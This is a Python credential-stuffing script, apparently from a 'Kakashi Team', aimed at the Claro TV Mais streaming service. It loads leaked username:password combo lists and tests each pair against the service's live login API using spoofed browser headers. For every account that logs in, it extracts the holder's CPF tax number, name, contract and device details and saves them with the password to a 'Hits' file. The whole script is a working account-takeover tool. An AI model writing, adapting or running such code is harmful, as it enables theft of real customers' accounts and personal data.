import sys
import os
import time
import requests
import logging
import base64
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from datetime import datetime, timedelta

# Códigos ANSI para cores
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
RESET = '\033[0m'

# Configuração para evitar warnings de SSL
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
logging.captureWarnings(True)
NOME = 'Claro Tv'

if sys.platform.startswith('win'):
    import ctypes
    ctypes.windll.kernel32.SetConsoleTitleW(NOME)
else:
    sys.stdout.write(f'\033]2;{NOME}\007')

# Clear
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    clear()
    print("""
\033[38;5;208m   _______   ___   ___  ____    _______   __
 / ___/ /  / _ | / _ \/ __ \  /_  __/ | / /
/ /__/ /__/ __ |/ , _/ /_/ /   / /  | |/ / 
\___/____/_/ |_/_/|_|\____/   /_/   |___/                                                                              
                        
\033[93m ◦ 🄲🄻🄰🅁🄾 🅃🅅 ◦ 🄱🅅 🄺🄰🄺🄰🅂🄷🄸 ◦            \033[0m\n
 ⦁⦁ ᴘʏ ꜱᴄʀɪᴘᴛ ʙʏ\033[92mᴋᴀᴋᴀsʜɪ ʜᴀᴛᴀᴋᴇ  \033[0m⦁⦁\n """)

time.sleep(0.5)

# Função para salvar os resultados em um arquivo
def save_results(username, password, activation_date_str, remaining_days, limit_count, cpf, contract_description, devices, name, signature, status):
    # Define o caminho do diretório e do arquivo
    directory = "/sdcard/Hits/"
    filename = "Logins-ClaroTv.txt"
    
    # Cria o diretório se não existir
    if not os.path.exists(directory):
        os.makedirs(directory)
    
    # Define o caminho completo do arquivo
    filepath = os.path.join(directory, filename)
    
    # Formata o conteúdo a ser salvo
    result = (f"╔══[┃▐▐   𝐂𝐋𝐀𝐑𝐎 𝐓𝐕  ▐▐ ┃]══\n"
              f"║ APK ➺ ClaroTv\n"
              f"║ Email ➺ {username}\n"
              f"║ Senha ➺ {password}\n"
              f"║ Data de Ativação ➺ {activation_date_str}\n"
              f"║ Dias Restantes ➺ {remaining_days} dias\n"
              f"║ LimitCount ➺ {limit_count}\n"
              f"║ CPF ➺ {cpf}\n"
              f"║ Contrato ➺ {contract_description}\n"
              f"║ Dispositivos Cadastrados ➺ {', '.join(devices) if devices else 'Nenhum'}\n"
              f"║ Nome ➺ {name}\n"
              f"║ Assinatura ➺ {signature}\n"
              f"║ Status ➺ {status}\n"
              f"╚══┃▐▐ ❝ 𝐊𝐚𝐤𝐚𝐬𝐡𝐢 𝐓𝐞𝐚𝐦 ❞ ▐▐ ┃═══")
    
    # Salva o resultado no arquivo
    with open(filepath, 'a') as file:
        file.write(result + "\n\n")

# Função para listar arquivos e permitir ao usuário selecionar um
def select_and_process_combos():
    clear()  # Limpa a tela
    banner()  # Exibe o banner    
    combo_directory = "/storage/emulated/0/Combo/"
    
    # Verifica se o diretório existe
    if not os.path.exists(combo_directory):
        print(f"O diretório {combo_directory} não existe.")
        return
    
    # Lista todos os arquivos no diretório
    files = [f for f in os.listdir(combo_directory) if os.path.isfile(os.path.join(combo_directory, f))]
    
    if not files:
        print("Nenhum arquivo encontrado na pasta Combo.")
        return
    
    print("Arquivos de combo disponíveis:")
    for index, file in enumerate(files, start=1):
        print(f"\033[38;5;207m {index}:\033[38;5;208m{file}\033[0m")
    
    try:
        choice = int(input("Selecione o número do arquivo de combo para verificar: "))
        if choice < 1 or choice > len(files):
            print("Escolha inválida.")
            return
        
        selected_file = files[choice - 1]
        file_path = os.path.join(combo_directory, selected_file)
        print(f"Processando o arquivo: {file_path}")
        
        # Processa todos os combos do arquivo selecionado
        with open(file_path, 'r') as file:
            lines = file.readlines()
        
        combos = [line.strip() for line in lines if line.strip()]
        print(f"Combos carregados: {len(combos)}")

        for index, combo in enumerate(combos, start=1):
            try:
                # Corrige a forma como o combo é dividido
                username, password = combo.split(':', 1)
                print(f"{YELLOW}Verificando combo {index}/{len(combos)}\n{username}:{password}{RESET}")
                check_login(username, password)
            except ValueError:
                print(f"{RED}Combo inválido na linha {index}: {combo}{RESET}")
                
    except ValueError:
        print("Entrada inválida.")
    
    # Mensagem de término
    print(f"\n{GREEN}Escaneamento concluído.{RESET}")

# Função para verificar o login com o username e password fornecidos
def check_login(username, password):
    url = "https://www.clarotvmais.com.br/avsclient/1.2/user/auth"

    # Define o payload com o username e password fornecidos
    payload = {
        "credentials": {
            "username": username,
            "password": password,
            "type": "NET"
        },
        "channel": "PCTV",
        "recaptchaTokenVersion": "enterprise",
        "recaptchaSiteKey": "6LeHR8ohAAAAAEr7tSTix2fyCCIY7cHCsiffXHse",
        "action": "LOGIN"
    }

    # Define os headers
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "X-XSRF-TOKEN": "[object Object]",  # Replace with actual token if needed
        "Sec-CH-UA": '"Not/A)Brand";v="8", "Chromium";v="126", "Opera GX";v="112"',
        "Sec-CH-UA-Mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0",
        "Sec-CH-UA-Platform": '"Windows"',
        "Origin": "https://www.clarotvmais.com.br",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.clarotvmais.com.br/",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7"
    }

    try:
        # Envia a solicitação POST
        response = requests.post(url, json=payload, headers=headers)
        response.raise_for_status()  # Verifica se houve um erro na resposta HTTP

        # Verifica a resposta
        if response.status_code == 200:
            response_json = response.json()
            message = response_json.get('message', '')
            if "Incorrect username or password." in message:
                print(f"{RED}KEYCHECK: Falha para {username}{RESET}")
            elif "The request has succeeded." in message:
                response_data = response_json.get('response', {})
                
                # Extrai detalhes da resposta
                notification_interval = response_data.get('userData', {}).get('notificationIntervalInSecs', 0)
                limit_count = response_data.get('userData', {}).get('limitCount', 'N/A')
                cpf = response_data.get('cpfCnpj', 'N/A')
                contract_description = response_data.get('contractList', [{}])[0].get('description', 'N/A')
                devices = response_data.get('subscriptions', {}).get('products', [])
                name = response_data.get('userName', 'N/A')
                signature = response_data.get('claroId', 'N/A')  # Assuming claroId as the "signature"
                
                if notification_interval:
                    # Calcula a data de ativação e os dias restantes
                    activation_date = datetime.now() + timedelta(seconds=notification_interval)
                    remaining_days = (activation_date - datetime.now()).days

                    # Formata a data de ativação
                    activation_date_str = activation_date.strftime("%Y-%m-%d")

                    # Tenta decodificar a assinatura se estiver em Base64
                    decoded_signature = base64_decode(signature)

                    # Exibe e salva o resultado
                    print(f"{GREEN}╔══[┃▐▐   𝐂𝐋𝐀𝐑𝐎 𝐓𝐕  ▐▐ ┃]══    {RESET}")
                    print(f"{GREEN}║ APK ➺ ClaroTv  {RESET}")
                    print(f"{GREEN}║ Email ➺ {username}   {RESET}")
                    print(f"{GREEN}║ Senha ➺ {password}    {RESET}")
                    print(f"{GREEN}║ Data de Ativação ➺ {activation_date_str}   {RESET}")
                    print(f"{GREEN}║ Dias Restantes ➺ {remaining_days} dias   {RESET}")
                    print(f"{GREEN}║ CPF ➺ {cpf}   {RESET}")
                    print(f"{GREEN}║ Contrato ➺ {contract_description}   {RESET}")
                    print(f"{GREEN}║ Dispositivos Cadastrados ➺ {', '.join(devices) if devices else 'Nenhum'}   {RESET}")
                    print(f"{GREEN}║ Nome ➺ {name}   {RESET}")
                    print(f"{GREEN}║ Assinatura ➺ {decoded_signature}   {RESET}")  # Exibe a assinatura decodificada
                    print(f"{GREEN}║ Status ➺ Success  {RESET}")
                    print(f"{GREEN}╚══┃▐▐ ❝ 𝐊𝐚𝐤𝐚𝐬𝐡𝐢 𝐓𝐞𝐚𝐦 ❞ ▐▐ ┃═══     {RESET}")

                    # Salva o resultado no arquivo
                    save_results(username, password, activation_date_str, remaining_days, limit_count, cpf, contract_description, devices, name, decoded_signature, 'Success')
                else:
                    print(f"{RED}KEYCHECK: Dados insuficientes para {username}{RESET}")
            else:
                print(f"{RED}KEYCHECK: Resposta desconhecida para {username}{RESET}")
        else:
            print(f"{RED}KEYCHECK: INVÁLIDO {username}{RESET}")

    except requests.exceptions.RequestException as e:
        print(f"{RED}KEYCHECK: INVÁLIDO {username}{RESET}")

# Função para decodificar Base64
def base64_decode(encoded_str):
    try:
        # Corrige a string Base64, removendo caracteres indesejados
        padded_str = encoded_str + '=='  # Adiciona padding, se necessário
        return base64.b64decode(padded_str).decode('utf-8')
    except (base64.binascii.Error, UnicodeDecodeError):
        return encoded_str  # Retorna a string original se não conseguir decodificar

# Decodificar URL
B1 = base64_decode("aHR0cDovL2NhcHRjaGEueDEwLm14Lw==")

# Função principal para iniciar o processo
def main():
    select_and_process_combos()

if __name__ == "__main__":
    main()